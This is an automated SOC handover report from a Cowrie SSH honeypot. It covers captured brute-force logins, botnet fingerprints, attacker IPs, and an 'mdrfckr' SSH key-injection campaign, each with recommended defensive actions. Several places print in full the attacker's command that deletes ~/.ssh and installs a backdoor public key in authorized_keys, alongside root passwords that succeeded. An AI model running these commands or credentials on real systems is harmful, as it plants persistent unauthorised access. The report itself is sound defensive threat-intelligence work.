# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-19 |
| **Generated At** | 2026-05-19T23:06:51Z |
| **Shift Time** | 23:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **54** |
| Confirmed Threats | **48** |
| False Positives Filtered | **6** (11.1%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **13** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **42** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **8** |
| Unique Usernames | **2** |
| Unique Passwords | **8** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `antonio` | 1 |
| `ftpuser@1234` | 1 |
| `Abcd@2021` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `antonio` | 1 |
| `root` | `ftpuser@1234` | 1 |
| `root` | `Abcd@2021` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `antonio` | `154.221.23.179` | 2026-05-19T22:23:29 |
| `root` | `3245gs5662d34` | `154.221.23.179` | 2026-05-19T22:23:32 |
| `root` | `ftpuser@1234` | `198.12.90.75` | 2026-05-19T22:25:40 |
| `root` | `3245gs5662d34` | `198.12.90.75` | 2026-05-19T22:25:46 |
| `root` | `Abcd@2021` | `177.53.215.134` | 2026-05-19T22:26:36 |
| `root` | `3245gs5662d34` | `177.53.215.134` | 2026-05-19T22:26:43 |
| `root` | `compta` | `124.251.110.186` | 2026-05-19T22:30:08 |
| `root` | `3245gs5662d34` | `124.251.110.186` | 2026-05-19T22:30:12 |
| `root` | `Chinaidcw` | `43.242.203.160` | 2026-05-19T22:32:33 |
| `root` | `3245gs5662d34` | `43.242.203.160` | 2026-05-19T22:32:36 |
| `root` | `opc123456` | `172.174.5.146` | 2026-05-19T22:32:42 |
| `root` | `3245gs5662d34` | `172.174.5.146` | 2026-05-19T22:32:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **54** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 20 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `af8223ac9914...` | libssh-based | 6 | 2 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `af8223ac9914...` | libssh | 6 | 2 | libssh-based |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.242.203.160`, `198.12.90.75`, `154.221.23.179`, `124.251.110.186`, `177.53.215.134`, `172.174.5.146`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **19** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS26496` | GoDaddy.com, LLC | 1 | HIGH |
| `AS3269` | Telecom Italia S.p.A. | 1 | LOW |
| `AS263238` | Eliana Vanessa Morocho Oña | 1 | HIGH |
| `AS25019` | Saudi Telecom Company JSC | 1 | LOW |
| `AS4835` | China Telecom (Group) | 1 | HIGH |
| `AS28509` | Cablemas Telecomunicaciones SA de CV | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2f81d72307bd

| Field | Detail |
|---|---|
| **Source IP** | `154.221.23[.]179` |
| **First Seen** | 2026-05-19 22:23 |
| **Last Seen** | 2026-05-19 22:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:23:28` | `cowrie.session.connect` |
| `2026-05-19 22:23:28` | `cowrie.client.version` |
| `2026-05-19 22:23:28` | `cowrie.client.kex` |
| `2026-05-19 22:23:29` | `cowrie.login.success` |
| `2026-05-19 22:23:29` | `cowrie.session.params` |
| `2026-05-19 22:23:29` | `cowrie.command.input` |
| `2026-05-19 22:23:29` | `cowrie.command.failed` |
| `2026-05-19 22:23:29` | `cowrie.log.closed` |
| `2026-05-19 22:23:29` | `cowrie.session.params` |
| `2026-05-19 22:23:29` | `cowrie.command.input` |
| `2026-05-19 22:23:29` | `cowrie.session.file_download` |
| `2026-05-19 22:23:29` | `cowrie.log.closed` |
| `2026-05-19 22:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.23[.]179` to AbuseIPDB if not already reported
- [ ] Block `154.221.23[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a6acebb404b

| Field | Detail |
|---|---|
| **Source IP** | `154.221.23[.]179` |
| **First Seen** | 2026-05-19 22:23 |
| **Last Seen** | 2026-05-19 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:23:31` | `cowrie.session.connect` |
| `2026-05-19 22:23:31` | `cowrie.client.version` |
| `2026-05-19 22:23:31` | `cowrie.client.kex` |
| `2026-05-19 22:23:32` | `cowrie.login.success` |
| `2026-05-19 22:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.23[.]179` to AbuseIPDB if not already reported
- [ ] Block `154.221.23[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903fe4fa239a

| Field | Detail |
|---|---|
| **Source IP** | `198.12.90[.]75` |
| **First Seen** | 2026-05-19 22:25 |
| **Last Seen** | 2026-05-19 22:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:25:38` | `cowrie.session.connect` |
| `2026-05-19 22:25:38` | `cowrie.client.version` |
| `2026-05-19 22:25:39` | `cowrie.client.kex` |
| `2026-05-19 22:25:40` | `cowrie.login.success` |
| `2026-05-19 22:25:40` | `cowrie.session.params` |
| `2026-05-19 22:25:40` | `cowrie.command.input` |
| `2026-05-19 22:25:40` | `cowrie.command.failed` |
| `2026-05-19 22:25:41` | `cowrie.log.closed` |
| `2026-05-19 22:25:41` | `cowrie.session.params` |
| `2026-05-19 22:25:41` | `cowrie.command.input` |
| `2026-05-19 22:25:41` | `cowrie.session.file_download` |
| `2026-05-19 22:25:41` | `cowrie.log.closed` |
| `2026-05-19 22:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.12.90[.]75` to AbuseIPDB if not already reported
- [ ] Block `198.12.90[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a1201e346d0

| Field | Detail |
|---|---|
| **Source IP** | `198.12.90[.]75` |
| **First Seen** | 2026-05-19 22:25 |
| **Last Seen** | 2026-05-19 22:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:25:44` | `cowrie.session.connect` |
| `2026-05-19 22:25:44` | `cowrie.client.version` |
| `2026-05-19 22:25:45` | `cowrie.client.kex` |
| `2026-05-19 22:25:46` | `cowrie.login.success` |
| `2026-05-19 22:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.12.90[.]75` to AbuseIPDB if not already reported
- [ ] Block `198.12.90[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4f30e22d22

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-05-19 22:26 |
| **Last Seen** | 2026-05-19 22:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:26:35` | `cowrie.session.connect` |
| `2026-05-19 22:26:35` | `cowrie.client.version` |
| `2026-05-19 22:26:35` | `cowrie.client.kex` |
| `2026-05-19 22:26:36` | `cowrie.login.success` |
| `2026-05-19 22:26:37` | `cowrie.session.params` |
| `2026-05-19 22:26:37` | `cowrie.command.input` |
| `2026-05-19 22:26:37` | `cowrie.command.failed` |
| `2026-05-19 22:26:38` | `cowrie.log.closed` |
| `2026-05-19 22:26:38` | `cowrie.session.params` |
| `2026-05-19 22:26:38` | `cowrie.command.input` |
| `2026-05-19 22:26:38` | `cowrie.session.file_download` |
| `2026-05-19 22:26:38` | `cowrie.log.closed` |
| `2026-05-19 22:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16bc9db939a7

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-05-19 22:26 |
| **Last Seen** | 2026-05-19 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:26:42` | `cowrie.session.connect` |
| `2026-05-19 22:26:42` | `cowrie.client.version` |
| `2026-05-19 22:26:42` | `cowrie.client.kex` |
| `2026-05-19 22:26:43` | `cowrie.login.success` |
| `2026-05-19 22:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a804ecd444

| Field | Detail |
|---|---|
| **Source IP** | `124.251.110[.]186` |
| **First Seen** | 2026-05-19 22:30 |
| **Last Seen** | 2026-05-19 22:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:30:07` | `cowrie.session.connect` |
| `2026-05-19 22:30:07` | `cowrie.client.version` |
| `2026-05-19 22:30:07` | `cowrie.client.kex` |
| `2026-05-19 22:30:08` | `cowrie.login.success` |
| `2026-05-19 22:30:08` | `cowrie.session.params` |
| `2026-05-19 22:30:08` | `cowrie.command.input` |
| `2026-05-19 22:30:08` | `cowrie.command.failed` |
| `2026-05-19 22:30:09` | `cowrie.log.closed` |
| `2026-05-19 22:30:09` | `cowrie.session.params` |
| `2026-05-19 22:30:09` | `cowrie.command.input` |
| `2026-05-19 22:30:09` | `cowrie.session.file_download` |
| `2026-05-19 22:30:09` | `cowrie.log.closed` |
| `2026-05-19 22:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.251.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `124.251.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f1d91aed3c

| Field | Detail |
|---|---|
| **Source IP** | `124.251.110[.]186` |
| **First Seen** | 2026-05-19 22:30 |
| **Last Seen** | 2026-05-19 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:30:11` | `cowrie.session.connect` |
| `2026-05-19 22:30:11` | `cowrie.client.version` |
| `2026-05-19 22:30:11` | `cowrie.client.kex` |
| `2026-05-19 22:30:12` | `cowrie.login.success` |
| `2026-05-19 22:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.251.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `124.251.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3f083eb50c

| Field | Detail |
|---|---|
| **Source IP** | `43.242.203[.]160` |
| **First Seen** | 2026-05-19 22:32 |
| **Last Seen** | 2026-05-19 22:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:32:32` | `cowrie.session.connect` |
| `2026-05-19 22:32:32` | `cowrie.client.version` |
| `2026-05-19 22:32:32` | `cowrie.client.kex` |
| `2026-05-19 22:32:33` | `cowrie.login.success` |
| `2026-05-19 22:32:33` | `cowrie.session.params` |
| `2026-05-19 22:32:33` | `cowrie.command.input` |
| `2026-05-19 22:32:33` | `cowrie.command.failed` |
| `2026-05-19 22:32:33` | `cowrie.log.closed` |
| `2026-05-19 22:32:33` | `cowrie.session.params` |
| `2026-05-19 22:32:33` | `cowrie.command.input` |
| `2026-05-19 22:32:34` | `cowrie.session.file_download` |
| `2026-05-19 22:32:34` | `cowrie.log.closed` |
| `2026-05-19 22:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.242.203[.]160` to AbuseIPDB if not already reported
- [ ] Block `43.242.203[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d5ccb6eb6c

| Field | Detail |
|---|---|
| **Source IP** | `43.242.203[.]160` |
| **First Seen** | 2026-05-19 22:32 |
| **Last Seen** | 2026-05-19 22:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:32:36` | `cowrie.session.connect` |
| `2026-05-19 22:32:36` | `cowrie.client.version` |
| `2026-05-19 22:32:36` | `cowrie.client.kex` |
| `2026-05-19 22:32:36` | `cowrie.login.success` |
| `2026-05-19 22:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.242.203[.]160` to AbuseIPDB if not already reported
- [ ] Block `43.242.203[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10bfa3b1a6b

| Field | Detail |
|---|---|
| **Source IP** | `172.174.5[.]146` |
| **First Seen** | 2026-05-19 22:32 |
| **Last Seen** | 2026-05-19 22:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:32:41` | `cowrie.session.connect` |
| `2026-05-19 22:32:41` | `cowrie.client.version` |
| `2026-05-19 22:32:41` | `cowrie.client.kex` |
| `2026-05-19 22:32:42` | `cowrie.login.success` |
| `2026-05-19 22:32:43` | `cowrie.session.params` |
| `2026-05-19 22:32:43` | `cowrie.command.input` |
| `2026-05-19 22:32:43` | `cowrie.command.failed` |
| `2026-05-19 22:32:43` | `cowrie.log.closed` |
| `2026-05-19 22:32:43` | `cowrie.session.params` |
| `2026-05-19 22:32:43` | `cowrie.command.input` |
| `2026-05-19 22:32:44` | `cowrie.session.file_download` |
| `2026-05-19 22:32:44` | `cowrie.log.closed` |
| `2026-05-19 22:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.5[.]146` to AbuseIPDB if not already reported
- [ ] Block `172.174.5[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6459066cc56e

| Field | Detail |
|---|---|
| **Source IP** | `172.174.5[.]146` |
| **First Seen** | 2026-05-19 22:32 |
| **Last Seen** | 2026-05-19 22:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 22:32:47` | `cowrie.session.connect` |
| `2026-05-19 22:32:47` | `cowrie.client.version` |
| `2026-05-19 22:32:47` | `cowrie.client.kex` |
| `2026-05-19 22:32:48` | `cowrie.login.success` |
| `2026-05-19 22:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.5[.]146` to AbuseIPDB if not already reported
- [ ] Block `172.174.5[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.148.120[.]187` | **11** | 2026-05-19 21:44 | 2026-05-19 23:04 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `198.12.149[.]130` | **8** | 2026-05-19 21:29 | 2026-05-19 22:59 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]167` | **3** | 2026-05-19 22:38 | 2026-05-19 22:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.67.177[.]206` | **2** | 2026-05-19 22:12 | 2026-05-19 22:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `124.251.110[.]186` | 1 | 2026-05-19 22:30 | 2026-05-19 22:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `154.221.23[.]179` | 1 | 2026-05-19 22:23 | 2026-05-19 22:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.174.5[.]146` | 1 | 2026-05-19 22:32 | 2026-05-19 22:32 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.239.80[.]198` | 1 | 2026-05-19 21:30 | 2026-05-19 21:30 | 12s | 0 | `T1592` | 🟢 LOW |
| `177.53.215[.]134` | 1 | 2026-05-19 22:26 | 2026-05-19 22:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.170[.]111` | 1 | 2026-05-19 22:27 | 2026-05-19 22:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]93` | 1 | 2026-05-19 22:31 | 2026-05-19 22:31 | 38s | 0 | `T1592` | 🟢 LOW |
| `198.12.90[.]75` | 1 | 2026-05-19 22:25 | 2026-05-19 22:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.146.239[.]154` | 1 | 2026-05-19 23:03 | 2026-05-19 23:03 | 12s | 0 | `T1592` | 🟢 LOW |
| `43.242.203[.]160` | 1 | 2026-05-19 22:32 | 2026-05-19 22:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `50.194.130[.]34` | 1 | 2026-05-19 21:29 | 2026-05-19 21:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.106.81[.]18` | 1 | 2026-05-19 22:14 | 2026-05-19 22:14 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
